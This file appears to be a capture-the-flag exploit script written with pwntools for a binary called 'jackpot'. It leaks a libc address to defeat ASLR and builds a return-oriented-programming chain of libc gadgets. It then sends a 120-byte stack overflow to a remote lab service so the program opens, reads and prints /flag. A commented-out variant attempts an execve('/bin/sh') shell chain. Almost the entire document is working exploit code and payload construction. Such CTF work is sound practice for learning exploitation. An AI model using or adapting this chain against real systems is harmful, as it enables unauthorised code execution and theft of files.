# %%

from pwn import *
# from Crypto.Util.number import long_to_bytes, bytes_to_long

# ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6a29446fdc623690715e3969bc03ec8d04b44e73, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# gef➤  p &jackpot
# $2 = (<text variable, no debug info> *) 0x40129e <jackpot>

# 000000000040129e <jackpot>:
# b *0x4013EA

# 0x000000000002a3e5 : pop rdi ; ret
# 0x000000000002be51 : pop rsi ; ret
# 0x00000000000796a2 : pop rdx ; ret
# 0x00000000000904a9 : pop rdx ; pop rbx ; ret
# 0x0000000000045eb0 : pop rax ; ret

# 0x00000000000bfc63 : mov qword ptr [rdi], rdx ; ret
# 0x0000000000029139 : ret
# 0x0000000000404180 - 0x00000000004041a0 is .bss

#    29db4:	0f 05                	syscall
#    ec069:	0f 05                	syscall
#   112558:	0f 05                	syscall

pop_rdi = 0x000000000002a3e5
pop_rsi = 0x000000000002be51
pop_rdx = 0x00000000000796a2
pop_rdx_rbx = 0x00000000000904a9
pop_rax = 0x0000000000045eb0

mov_q_prdi_rdx = 0x00000000000bfc63
ret = 0x0000000000029139

syscall_addr = 0x29db4
# syscall_addr = 0xec069
# syscall_addr = 0x112558

# %%

context.arch = "amd64"
context.os == "linux"
context.terminal = ["tmux", "splitw", "-h"]

argv = ['./src/jackpot/share/jackpot']

gdbscript = 'gef\ngef\n'
gdbscript += 'set follow-fork-mode child\n'

# conn = gdb.debug(argv, gdbscript)

conn = remote('10.105.0.21', 12334)
# conn = process(argv)
# _pid = gdb.attach(conn, gdbscript)

# %%

jackpot_addr = 0x40129e

# %%

# bof_payload = flat({
#     0: b"a\x00",
#     # 104: jackpot_addr,  # 29: 100 + 4
#     120: jackpot_addr,  # 31: 100 + 4 + (8 * 2)
# })

print("1")
conn.recvuntil(b"Give me your number: ")
# conn.sendline(b"29")
conn.sendline(b"31")

print("2")
conn.recvuntil(b"Here is your ticket 0x")
_addr = conn.recvline().strip()
_addr = int(_addr, 16)

print(f"{hex(_addr) = }")

offset = 0x29d90  # 0x7f6616e29d90 - 0x7f6616e00000

libc_base = _addr - offset

print(f"{hex(libc_base) = }")
print()

libc_pop_rdi = libc_base + pop_rdi
libc_pop_rsi = libc_base + pop_rsi
libc_pop_rdx = libc_base + pop_rdx
libc_pop_rdx_rbx = libc_base + pop_rdx_rbx
libc_pop_rax = libc_base + pop_rax
libc_mov_q_prdi_rdx = libc_base + mov_q_prdi_rdx
libc_syscall_addr = libc_base + syscall_addr
libc_ret = libc_base + ret

print(f"{hex(libc_pop_rdi) = }")
print(f"{hex(libc_pop_rsi) = }")
print(f"{hex(libc_pop_rdx) = }")
print(f"{hex(libc_pop_rdx_rbx) = }")
print(f"{hex(libc_pop_rax) = }")
print(f"{hex(libc_mov_q_prdi_rdx) = }")
print(f"{hex(libc_syscall_addr) = }")
print(f"{hex(libc_ret) = }")
print()

# payload = bof_payload + b"deadbeef" + p64(exp_addr)
# payload = bof_payload + p64(exp_addr)

# payload = b"a" + b"\x00" * 119 + p64(jackpot_addr) + p64(exp_addr)

bss_1 = 0x404180
bss_2 = 0x404190

# f_name = u64(b"/bin/sh\x00")
# # Program terminated with signal SIGSYS, Bad system call.

# payload = flat([
#     # ------ #
#     #
#     libc_pop_rdi,
#     bss_1,
#     #
#     libc_pop_rdx_rbx,
#     f_name,
#     0,
#     libc_mov_q_prdi_rdx,
#     # ------ #
#     #
#     libc_pop_rdi,
#     bss_1,
#     libc_pop_rsi,
#     0,
#     libc_pop_rdx_rbx,
#     0,
#     0,
#     libc_pop_rax,
#     59,
#     libc_syscall_addr,
# ])

f_name = u64(b'/flag\x00'.ljust(8, b'\x00'))

payload = flat([
    # #
    # libc_ret,  # stack alignment
    # ------ #
    #
    libc_pop_rdi,
    bss_1,
    #
    libc_pop_rdx_rbx,
    f_name,
    0,
    libc_mov_q_prdi_rdx,
    # ----- #
    #
    libc_pop_rdi,
    bss_1,
    libc_pop_rsi,
    0,
    libc_pop_rdx_rbx,
    0,
    0,
    libc_pop_rax,
    0x2,  # open
    libc_syscall_addr,
    # ----- #
    #
    libc_pop_rdi,
    3,  # fd
    libc_pop_rsi,
    bss_2,
    libc_pop_rdx_rbx,
    0x30,
    0,
    libc_pop_rax,
    0x0,  # read
    libc_syscall_addr,
    # ----- #
    #
    libc_pop_rdi,
    1,
    libc_pop_rsi,
    bss_2,
    libc_pop_rdx_rbx,
    0x30,
    0,
    libc_pop_rax,
    0x1,  # write
    libc_syscall_addr,
])

print(f"{len(payload) = }")

payload = b"\x00" * 120 + payload
# payload = b"\x00" * 120 + p64(jackpot_addr) + payload

# payload = b"\x00" * (120 - 16) + payload
# payload = b"\x00" * 120 + p64(jackpot_addr) + b"\x00" * 8 + payload

print(f"{payload = }")
print()

print("3")
conn.recvuntil(b"Sign your name: ")
conn.sendline(payload)

print("4")
conn.interactive()
